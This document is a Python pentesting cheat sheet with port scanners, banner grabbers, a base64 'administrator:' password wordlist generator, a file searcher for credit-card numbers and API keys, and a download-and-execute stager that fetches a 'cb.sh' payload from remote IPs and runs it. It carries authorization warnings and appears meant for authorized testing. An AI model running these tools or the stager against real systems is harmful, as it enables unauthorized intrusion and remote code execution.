# Python Security and Network Automation Tools

## Table of Contents
- [Port Scanning](#port-scanning)
- [Data Encoding](#data-encoding)
- [Registry Analysis](#registry-analysis)
- [File Analysis](#file-analysis)
- [HTTP Servers](#http-servers)
- [Network Operations](#network-operations)
- [Email Operations](#email-operations)
- [Utility Functions](#utility-functions)
- [HTTP Banner Grabbing](#http-banner-grabbing)
- [Best Practices](#best-practices)

---

## Port Scanning

### Basic Port Scanner

**Description**: Scan a range of ports on a target IP address

**WARNING**: Only use on systems you own or have explicit authorization to test.

```python
import socket as sk

for port in range(<START_PORT>, <END_PORT>):
    try:
        s = sk.socket(sk.AF_INET, sk.SOCK_STREAM)
        s.settimeout(1000)
        s.connect(('<IP_ADDRESS>', port))
        print('%d:OPEN' % (port))
        s.close()
    except:
        continue
```

**Usage Example**:
```python
import socket as sk

# Scan ports 80-100 on localhost
for port in range(80, 101):
    try:
        s = sk.socket(sk.AF_INET, sk.SOCK_STREAM)
        s.settimeout(1)  # 1 second timeout
        s.connect(('127.0.0.1', port))
        print('%d:OPEN' % (port))
        s.close()
    except:
        continue
```

### Advanced Multi-threaded Port Scanner

```python
import socket
import threading
from queue import Queue

def scan_port(host, port, results):
    """Scan a single port"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        sock.close()

        if result == 0:
            results.append(port)
            print(f"Port {port}: OPEN")
    except:
        pass

def worker(host, queue, results):
    """Thread worker function"""
    while not queue.empty():
        port = queue.get()
        scan_port(host, port, results)
        queue.task_done()

def port_scan(host, start_port, end_port, threads=100):
    """Multi-threaded port scanner"""
    queue = Queue()
    results = []

    # Fill queue with ports to scan
    for port in range(start_port, end_port + 1):
        queue.put(port)

    # Create thread pool
    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=worker, args=(host, queue, results))
        thread.daemon = True
        thread.start()
        thread_list.append(thread)

    # Wait for all threads to complete
    queue.join()

    return sorted(results)

# Usage
if __name__ == "__main__":
    target = "192.168.1.1"
    open_ports = port_scan(target, 1, 1024, threads=50)
    print(f"\nOpen ports on {target}: {open_ports}")
```

---

## Data Encoding

### Base64 Wordlist Generator

**Description**: Generate Base64-encoded wordlist with prefix

```python
#!/usr/bin/python
import base64

file1 = open("<PLAINTEXT_FILE_PATH>", "r")
file2 = open("<ENCODED_FILE_PATH>", "w")

for line in file1:
    clear = "administrator:" + str.strip(line)
    new = base64.b64encode(clear.encode())
    file2.write(new.decode() + "\n")

file1.close()
file2.close()
```

**Usage Example**:
```python
#!/usr/bin/python
import base64

# Create wordlist with username prefix
input_file = "passwords.txt"
output_file = "base64_wordlist.txt"

with open(input_file, "r") as f1, open(output_file, "w") as f2:
    for line in f1:
        # Strip whitespace and create credential string
        clear = "administrator:" + line.strip()
        # Encode to base64
        encoded = base64.b64encode(clear.encode())
        # Write to output file
        f2.write(encoded.decode() + "\n")

print(f"Base64 wordlist created: {output_file}")
```

### Advanced Encoding/Decoding Utilities

```python
import base64
import binascii

def encode_base64(data):
    """Encode data to Base64"""
    return base64.b64encode(data.encode()).decode()

def decode_base64(data):
    """Decode Base64 data"""
    return base64.b64decode(data.encode()).decode()

def encode_hex(data):
    """Encode data to hex"""
    return binascii.hexlify(data.encode()).decode()

def decode_hex(data):
    """Decode hex data"""
    return binascii.unhexlify(data.encode()).decode()

def encode_url(data):
    """URL encode data"""
    from urllib.parse import quote
    return quote(data)

def decode_url(data):
    """URL decode data"""
    from urllib.parse import unquote
    return unquote(data)

# Usage examples
text = "admin:password123"
b64 = encode_base64(text)
hex_data = encode_hex(text)
print(f"Base64: {b64}")
print(f"Hex: {hex_data}")
print(f"Decoded: {decode_base64(b64)}")
```

---

## Registry Analysis

### Convert Windows Registry Hex to ASCII

**Description**: Parse Windows registry hex format and extract readable ASCII strings

```python
import sys
import string

dataFormatHex = bytearray.fromhex(sys.argv[1]).decode()
output = ""

for char in dataFormatHex:
    if char in string.printable:
        output += char
    else:
        output += "."

print("\n" + output)
```

**Usage**:
```bash
python registry_parser.py "48656c6c6f20576f726c64"
# Output: Hello World
```

### Advanced Registry Parser

```python
#!/usr/bin/python
import sys
import string
import re

def parse_registry_hex(hex_string):
    """Parse Windows registry hex format to ASCII"""
    try:
        # Remove spaces and common delimiters
        hex_clean = hex_string.replace(" ", "").replace(",", "").replace("\\", "")

        # Convert hex to bytes
        byte_data = bytearray.fromhex(hex_clean)

        # Decode to string
        try:
            # Try UTF-16 LE (Windows common format)
            decoded = byte_data.decode('utf-16-le')
        except:
            # Fallback to ASCII
            decoded = byte_data.decode('ascii', errors='ignore')

        # Filter printable characters
        output = ""
        for char in decoded:
            if char in string.printable and char not in '\r\n\t':
                output += char
            elif char == '\n':
                output += '\n'
            else:
                output += "."

        return output.strip()

    except Exception as e:
        return f"Error parsing hex: {e}"

def extract_registry_values(hex_string):
    """Extract multiple null-terminated strings from registry data"""
    try:
        byte_data = bytearray.fromhex(hex_string.replace(" ", ""))
        decoded = byte_data.decode('utf-16-le', errors='ignore')

        # Split on null characters and filter empty strings
        values = [v for v in decoded.split('\x00') if v.strip()]

        return values
    except Exception as e:
        return []

# Usage
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python registry_parser.py <hex_string>")
        sys.exit(1)

    hex_input = sys.argv[1]
    result = parse_registry_hex(hex_input)
    print("\nParsed output:")
    print(result)

    print("\nExtracted values:")
    for value in extract_registry_values(hex_input):
        print(f"  - {value}")
```

---

## File Analysis

### Search Files for Regex Patterns

**Description**: Read all files in a folder and search for regex patterns

```python
import glob
import re

for msg in glob.glob('/tmp/*.txt'):
    filer = open((msg), 'r')
    data = filer.read()
    message = re.findall(r'<message>(.*?)</message>', data, re.DOTALL)
    print("File %s contains %s" % (str(msg), message))
    filer.close()
```

### Advanced File Pattern Searcher

```python
#!/usr/bin/python
import glob
import re
import os
import sys

def search_files(directory, pattern, file_extension="*"):
    """Search files for regex pattern"""
    results = {}

    # Build file glob pattern
    search_pattern = os.path.join(directory, f"*.{file_extension}")

    # Compile regex pattern
    regex = re.compile(pattern, re.DOTALL | re.MULTILINE)

    for filepath in glob.glob(search_pattern):
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                matches = regex.findall(content)

                if matches:
                    results[filepath] = matches
                    print(f"\n[+] File: {filepath}")
                    print(f"    Matches: {len(matches)}")
                    for i, match in enumerate(matches[:5], 1):  # Show first 5
                        preview = match[:100] + "..." if len(match) > 100 else match
                        print(f"    [{i}] {preview}")

        except Exception as e:
            print(f"[-] Error reading {filepath}: {e}")

    return results

def search_files_multipattern(directory, patterns, file_extension="*"):
    """Search files for multiple regex patterns"""
    all_results = {}

    for pattern_name, pattern in patterns.items():
        print(f"\n{'='*60}")
        print(f"Searching for pattern: {pattern_name}")
        print(f"{'='*60}")

        results = search_files(directory, pattern, file_extension)
        all_results[pattern_name] = results

    return all_results

# Usage examples
if __name__ == "__main__":
    directory = "/tmp"

    # Single pattern search
    pattern = r'<message>(.*?)</message>'
    results = search_files(directory, pattern, "txt")

    # Multi-pattern search
    patterns = {
        "IP Addresses": r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b',
        "Email Addresses": r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
        "URLs": r'https?://[^\s<>"]+',
        "Credit Cards": r'\b(?:\d{4}[-\s]?){3}\d{4}\b',
        "API Keys": r'[A-Za-z0-9]{32,}',
    }

    all_results = search_files_multipattern(directory, patterns, "txt")

    # Summary
    print(f"\n{'='*60}")
    print("SUMMARY")
    print(f"{'='*60}")
    for pattern_name, results in all_results.items():
        print(f"{pattern_name}: {len(results)} files with matches")
```

---

## HTTP Servers

### SSL Encrypted SimpleHTTPServer

**Description**: Create an HTTPS server with self-signed certificate

**Step 1**: Create SSL certificate
```bash
openssl req -new -x509 -keyout cert.pem -out cert.pem -days 365 -nodes
```

**Step 2**: Create Python HTTPS server
```python
# httpserver.py
import http.server
import ssl
import socketserver

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain("cert.pem")

server_address = ('localhost', 4443)
handler = http.server.SimpleHTTPRequestHandler

with socketserver.TCPServer(server_address, handler) as httpd:
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
    print(f"Serving HTTPS on {server_address[0]}:{server_address[1]}")
    httpd.serve_forever()
```

**Usage**:
```bash
python httpserver.py
# Access via: https://localhost:4443
```

### Advanced HTTP/HTTPS Server with Authentication

```python
#!/usr/bin/python
import http.server
import ssl
import socketserver
import base64
from functools import partial

class AuthHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    """HTTP request handler with basic authentication"""

    def __init__(self, *args, username=None, password=None, **kwargs):
        self.username = username
        self.password = password
        super().__init__(*args, **kwargs)

    def do_AUTHHEAD(self):
        self.send_response(401)
        self.send_header('WWW-Authenticate', 'Basic realm="Secure Area"')
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        # Check authentication
        if self.username and self.password:
            auth_header = self.headers.get('Authorization')

            if auth_header is None:
                self.do_AUTHHEAD()
                self.wfile.write(b'Authentication required')
                return

            # Decode credentials
            auth_decoded = base64.b64decode(auth_header.split()[1]).decode('utf-8')
            provided_user, provided_pass = auth_decoded.split(':', 1)

            if provided_user != self.username or provided_pass != self.password:
                self.do_AUTHHEAD()
                self.wfile.write(b'Invalid credentials')
                return

        # Authentication passed, serve file
        super().do_GET()

def create_server(port=8000, use_ssl=False, cert_file=None, username=None, password=None):
    """Create HTTP or HTTPS server with optional authentication"""

    handler = partial(AuthHTTPRequestHandler, username=username, password=password)

    with socketserver.TCPServer(("", port), handler) as httpd:
        if use_ssl and cert_file:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(cert_file)
            httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
            protocol = "HTTPS"
        else:
            protocol = "HTTP"

        print(f"Serving {protocol} on port {port}")
        if username and password:
            print(f"Authentication: {username}:{password}")

        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\nShutting down server...")

# Usage
if __name__ == "__main__":
    # HTTP server with authentication
    # create_server(port=8000, username="admin", password="secret")

    # HTTPS server with authentication
    create_server(port=4443, use_ssl=True, cert_file="cert.pem",
                  username="admin", password="secret")
```

### Basic HTTP Server (Python 3)

```bash
# Serve current directory on port 8000
python -m http.server 8000

# Python 2
python -m SimpleHTTPServer 8000
```

---

## Network Operations

### Download and Execute Script from Multiple IPs

**WARNING**: This demonstrates automated payload execution. Only use in authorized testing environments.

```python
#!/usr/bin/python
import os
from urllib.request import urlopen

urls = ["<IP_ADDRESS1>", "<IP_ADDRESS2>"]
port = "<PORT_TO_CONNECT>"
payload = "cb.sh"

for url in urls:
    u = "http://%s:%s/%s" % (url, port, payload)
    try:
        r = urlopen(u)
        wfile = open("/tmp/cb.sh", "wb")
        wfile.write(r.read())
        wfile.close()
        break
    except:
        continue

if os.path.exists("/tmp/cb.sh"):
    os.system("chmod 700 /tmp/cb.sh")
    os.system("/tmp/cb.sh")
```

### Advanced Network File Downloader

```python
#!/usr/bin/python
import os
import sys
import hashlib
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError

def download_file(url, output_path, timeout=10):
    """Download file from URL with error handling"""
    try:
        # Create request with user-agent
        req = Request(url, headers={'User-Agent': 'Mozilla/5.0'})

        # Download file
        with urlopen(req, timeout=timeout) as response:
            data = response.read()

            # Write to file
            with open(output_path, 'wb') as f:
                f.write(data)

            # Calculate hash
            file_hash = hashlib.sha256(data).hexdigest()

            print(f"[+] Downloaded: {output_path}")
            print(f"[+] Size: {len(data)} bytes")
            print(f"[+] SHA256: {file_hash}")

            return True

    except HTTPError as e:
        print(f"[-] HTTP Error {e.code}: {e.reason}")
    except URLError as e:
        print(f"[-] URL Error: {e.reason}")
    except Exception as e:
        print(f"[-] Error: {e}")

    return False

def download_from_multiple_sources(urls, output_path, port=80, filename="payload.sh"):
    """Try downloading from multiple sources"""
    for ip in urls:
        url = f"http://{ip}:{port}/{filename}"
        print(f"\n[*] Trying: {url}")

        if download_file(url, output_path):
            print(f"[+] Successfully downloaded from {ip}")
            return True

    print("[-] Failed to download from all sources")
    return False

def execute_script(script_path, verify_hash=None):
    """Execute script with optional hash verification"""
    if not os.path.exists(script_path):
        print(f"[-] Script not found: {script_path}")
        return False

    # Verify hash if provided
    if verify_hash:
        with open(script_path, 'rb') as f:
            file_hash = hashlib.sha256(f.read()).hexdigest()

        if file_hash != verify_hash:
            print(f"[-] Hash mismatch! Expected: {verify_hash}, Got: {file_hash}")
            return False

        print(f"[+] Hash verified: {file_hash}")

    # Make executable
    os.chmod(script_path, 0o700)

    # Execute
    print(f"[*] Executing: {script_path}")
    result = os.system(script_path)

    return result == 0

# Usage
if __name__ == "__main__":
    sources = ["192.168.1.100", "192.168.1.101", "10.0.0.50"]
    output = "/tmp/payload.sh"

    # Download from multiple sources
    if download_from_multiple_sources(sources, output, port=8000, filename="script.sh"):
        # Execute if download successful
        # execute_script(output)  # Uncomment to execute
        pass
```

---

## Email Operations

### Email Sender (Requires sendmail)

**Description**: Send emails with attachments using SMTP

```python
import smtplib
from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart

server = smtplib.SMTP('<SMTP_SERVER>', <PORT>)
server.ehlo()

with open('<PASSWORD_FILE_PATH>', 'r') as f:
    password = f.read()

server.login('<EMAIL>', password)

msg = MIMEMultipart()
msg['From'] = '<FROM_EMAIL>'
msg['To'] = '<TO_EMAIL>'
msg['Subject'] = '<SUBJECT_LINE>'

with open('<MESSAGE_FILE_PATH>', 'r') as f:
    message = f.read()

msg.attach(MIMEText(message, 'plain'))

text = msg.as_string()
server.sendmail('<FROM_EMAIL>', '<TO_EMAIL>', text)
server.quit()
```

### Advanced Email Sender with Attachments

```python
#!/usr/bin/python
import smtplib
import os
from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart

def send_email(smtp_server, port, username, password, from_email, to_email,
               subject, message, attachments=None, use_tls=True):
    """Send email with optional attachments"""

    try:
        # Create SMTP connection
        if use_tls:
            server = smtplib.SMTP(smtp_server, port)
            server.ehlo()
            server.starttls()
        else:
            server = smtplib.SMTP_SSL(smtp_server, port)

        # Login
        server.login(username, password)

        # Create message
        msg = MIMEMultipart()
        msg['From'] = from_email
        msg['To'] = to_email
        msg['Subject'] = subject

        # Add message body
        msg.attach(MIMEText(message, 'plain'))

        # Add attachments
        if attachments:
            for filepath in attachments:
                if os.path.exists(filepath):
                    filename = os.path.basename(filepath)

                    with open(filepath, 'rb') as f:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(f.read())

                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition',
                                    f'attachment; filename= {filename}')
                    msg.attach(part)

                    print(f"[+] Attached: {filename}")
                else:
                    print(f"[-] Attachment not found: {filepath}")

        # Send email
        text = msg.as_string()
        server.sendmail(from_email, to_email, text)
        server.quit()

        print(f"[+] Email sent successfully to {to_email}")
        return True

    except Exception as e:
        print(f"[-] Error sending email: {e}")
        return False

# Usage example
if __name__ == "__main__":
    # Email configuration
    config = {
        'smtp_server': 'smtp.gmail.com',
        'port': 587,
        'username': 'your_email@gmail.com',
        'password': 'your_app_password',
        'from_email': 'your_email@gmail.com',
        'to_email': 'recipient@example.com',
        'subject': 'Test Email with Attachment',
        'message': 'This is a test email sent from Python.',
        'attachments': ['report.pdf', 'data.csv'],
        'use_tls': True
    }

    send_email(**config)
```

---

## Utility Functions

### Generate Random String

**Description**: Generate random alphanumeric string of N length

```python
import string
import random

n = 10
randstr = "".join(random.choice(string.ascii_letters + string.digits) for n in range(n))
print(randstr)
```

### Advanced Random String Generator

```python
#!/usr/bin/python
import string
import random
import secrets  # More secure than random

def generate_random_string(length=10, charset="alphanumeric"):
    """Generate random string with various character sets"""

    charsets = {
        "alphanumeric": string.ascii_letters + string.digits,
        "alpha": string.ascii_letters,
        "numeric": string.digits,
        "lowercase": string.ascii_lowercase + string.digits,
        "uppercase": string.ascii_uppercase + string.digits,
        "hex": string.hexdigits.lower()[:16],
        "special": string.ascii_letters + string.digits + string.punctuation,
        "base64": string.ascii_letters + string.digits + "+/",
    }

    chars = charsets.get(charset, charsets["alphanumeric"])

    # Use secrets for cryptographically strong random
    return ''.join(secrets.choice(chars) for _ in range(length))

def generate_password(length=16, include_special=True):
    """Generate secure password"""
    # Ensure at least one of each required character type
    password = [
        secrets.choice(string.ascii_uppercase),
        secrets.choice(string.ascii_lowercase),
        secrets.choice(string.digits),
    ]

    chars = string.ascii_letters + string.digits
    if include_special:
        password.append(secrets.choice(string.punctuation))
        chars += string.punctuation

    # Fill remaining length
    password.extend(secrets.choice(chars) for _ in range(length - len(password)))

    # Shuffle
    random.shuffle(password)

    return ''.join(password)

def generate_api_key(length=32):
    """Generate API key"""
    return secrets.token_hex(length // 2)

def generate_uuid():
    """Generate UUID"""
    import uuid
    return str(uuid.uuid4())

# Usage examples
if __name__ == "__main__":
    print(f"Random string (10 chars): {generate_random_string(10)}")
    print(f"Lowercase only: {generate_random_string(12, 'lowercase')}")
    print(f"Hex string: {generate_random_string(16, 'hex')}")
    print(f"Secure password: {generate_password(16)}")
    print(f"API key: {generate_api_key(32)}")
    print(f"UUID: {generate_uuid()}")
```

---

## HTTP Banner Grabbing

### Custom Python HTTP Banner Grabber

**Description**: Scan IP range and grab HTTP server banners

```python
#!/usr/bin/python
# Sample syntax: python test.py -t 127.0.0.1-2 -p 8000 -d 1
import sys
import time
from urllib.request import urlopen
from optparse import OptionParser

parser = OptionParser()
parser.add_option("-t", dest="iprange", help="target IP range, i.e. 192.168.1.1-25")
parser.add_option("-p", dest="port", default="80", help="port, default=80")
parser.add_option("-d", dest="delay", default=".5", help="delay (in seconds), default=.5 seconds")

(opts, args) = parser.parse_args()

if opts.iprange is None:
    parser.error("you must supply an IP range")

ips = []
headers = {}

octets = opts.iprange.split('.')
start = octets[3].split('-')[0]
stop = octets[3].split('-')[1]

for i in range(int(start), int(stop) + 1):
    ips.append('%s.%s.%s.%d' % (octets[0], octets[1], octets[2], i))

print("\nScanning IPs: %s\n" % (ips))

for ip in ips:
    try:
        response = urlopen("http://{}:{}".format(ip, opts.port))
        headers[ip] = dict(response.info())
    except Exception as e:
        headers[ip] = "Error: " + str(e)
    time.sleep(float(opts.delay))

for header in headers:
    try:
        print("%s : %s" % (header, headers[header].get('server')))
    except:
        print("%s : %s" % (header, headers[header]))
```

### Advanced Banner Grabber with Service Detection

```python
#!/usr/bin/python
import socket
import sys
import time
from optparse import OptionParser
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError

def grab_banner_socket(host, port, timeout=5):
    """Grab banner using raw socket connection"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        # Try to receive banner (some services send it automatically)
        sock.send(b'\r\n')
        banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        sock.close()

        return banner if banner else "No banner"
    except Exception as e:
        return f"Error: {e}"

def grab_http_banner(host, port, timeout=5):
    """Grab HTTP server banner"""
    try:
        url = f"http://{host}:{port}/"
        req = Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        response = urlopen(req, timeout=timeout)

        headers = dict(response.info())
        server = headers.get('server', headers.get('Server', 'Unknown'))

        # Additional header info
        powered_by = headers.get('x-powered-by', headers.get('X-Powered-By', ''))

        banner = f"{server}"
        if powered_by:
            banner += f" | {powered_by}"

        return banner
    except HTTPError as e:
        return f"HTTP {e.code}"
    except Exception as e:
        return f"Error: {e}"

def grab_https_banner(host, port, timeout=5):
    """Grab HTTPS server banner"""
    import ssl
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        url = f"https://{host}:{port}/"
        req = Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        response = urlopen(req, timeout=timeout, context=context)

        headers = dict(response.info())
        server = headers.get('server', headers.get('Server', 'Unknown'))

        return server
    except Exception as e:
        return f"Error: {e}"

def scan_ip_range(ip_range, port, delay=0.5, service_type="http"):
    """Scan IP range and grab banners"""

    # Parse IP range
    octets = ip_range.split('.')
    if '-' in octets[3]:
        start, stop = octets[3].split('-')
    else:
        start = stop = octets[3]

    base_ip = '.'.join(octets[:3])

    results = {}

    print(f"\n[*] Scanning {base_ip}.{start}-{stop} on port {port}")
    print(f"[*] Service type: {service_type}")
    print(f"[*] Delay: {delay}s\n")

    for i in range(int(start), int(stop) + 1):
        ip = f"{base_ip}.{i}"

        # Grab banner based on service type
        if service_type == "http":
            banner = grab_http_banner(ip, port)
        elif service_type == "https":
            banner = grab_https_banner(ip, port)
        else:
            banner = grab_banner_socket(ip, port)

        results[ip] = banner
        print(f"{ip}:{port} -> {banner}")

        time.sleep(delay)

    return results

def main():
    parser = OptionParser(usage="Usage: %prog -t TARGET -p PORT [options]")
    parser.add_option("-t", "--target", dest="target",
                      help="Target IP range (e.g., 192.168.1.1-25)")
    parser.add_option("-p", "--port", dest="port", default="80",
                      help="Target port (default: 80)")
    parser.add_option("-d", "--delay", dest="delay", default="0.5",
                      help="Delay between requests in seconds (default: 0.5)")
    parser.add_option("-s", "--service", dest="service", default="http",
                      help="Service type: http, https, or socket (default: http)")

    (opts, args) = parser.parse_args()

    if not opts.target:
        parser.error("Target IP range required (-t)")

    # Scan
    results = scan_ip_range(opts.target, int(opts.port),
                           float(opts.delay), opts.service)

    # Summary
    print(f"\n{'='*60}")
    print("SCAN SUMMARY")
    print(f"{'='*60}")

    active_hosts = [ip for ip, banner in results.items() if "Error" not in banner]
    print(f"Total IPs scanned: {len(results)}")
    print(f"Active hosts: {len(active_hosts)}")

    # Group by server type
    servers = {}
    for ip, banner in results.items():
        if "Error" not in banner:
            servers.setdefault(banner, []).append(ip)

    print(f"\nServer distribution:")
    for server, ips in servers.items():
        print(f"  {server}: {len(ips)} host(s)")

if __name__ == "__main__":
    main()
```

**Usage Examples**:
```bash
# Scan HTTP servers
python banner_grabber.py -t 192.168.1.1-10 -p 80 -d 0.5

# Scan HTTPS servers
python banner_grabber.py -t 10.0.0.1-50 -p 443 -s https -d 1

# Scan custom port with socket
python banner_grabber.py -t 172.16.0.1-5 -p 8080 -s socket
```

---

## Best Practices

### Security Considerations

1. **Authorization**: Only scan/test systems you own or have explicit permission to test
2. **Rate Limiting**: Use appropriate delays to avoid overwhelming targets
3. **Logging**: Log all operations for audit purposes
4. **Error Handling**: Always implement proper error handling
5. **Secure Credentials**: Never hardcode credentials; use environment variables or secure vaults
6. **TLS/SSL**: Use HTTPS and verify certificates in production
7. **Input Validation**: Sanitize all user inputs
8. **Least Privilege**: Run scripts with minimum required permissions

### Code Quality

1. **Documentation**: Comment complex logic and document function parameters
2. **Error Messages**: Provide clear, actionable error messages
3. **Timeouts**: Always set timeouts for network operations
4. **Resource Cleanup**: Close files, sockets, and connections properly
5. **Testing**: Test scripts in safe environments before production use
6. **Version Control**: Track changes and maintain version history

### Performance Optimization

1. **Multi-threading**: Use threads or async for I/O-bound operations
2. **Connection Pooling**: Reuse connections when possible
3. **Caching**: Cache results to avoid redundant operations
4. **Batch Operations**: Process data in batches for better performance
5. **Memory Management**: Be mindful of memory usage with large datasets

---

## Legal and Ethical Notice

**IMPORTANT**: These tools are provided for educational purposes and authorized security testing only.

- ✅ **Authorized Use**: Penetration testing with written permission, security research on owned systems, CTF competitions
- ❌ **Unauthorized Use**: Scanning/testing systems without permission, accessing unauthorized networks, malicious activities

**Always**:
- Obtain written authorization before testing
- Comply with local laws and regulations
- Follow responsible disclosure practices
- Respect privacy and data protection laws
- Document all testing activities

**Unauthorized access to computer systems is illegal in most jurisdictions and may result in criminal charges.**

---

## Additional Resources

- **Python Security Libraries**:
  - `cryptography` - Cryptographic recipes and primitives
  - `paramiko` - SSH protocol implementation
  - `requests` - HTTP library
  - `scapy` - Packet manipulation (see SCAPY-REFERENCE.md)

- **Documentation**:
  - Python Socket Programming: https://docs.python.org/3/library/socket.html
  - Python SSL/TLS: https://docs.python.org/3/library/ssl.html
  - OWASP Python Security: https://owasp.org/www-project-python-security/

- **Tools**:
  - Nmap - Network scanner
  - Wireshark - Packet analyzer
  - Burp Suite - Web application security testing
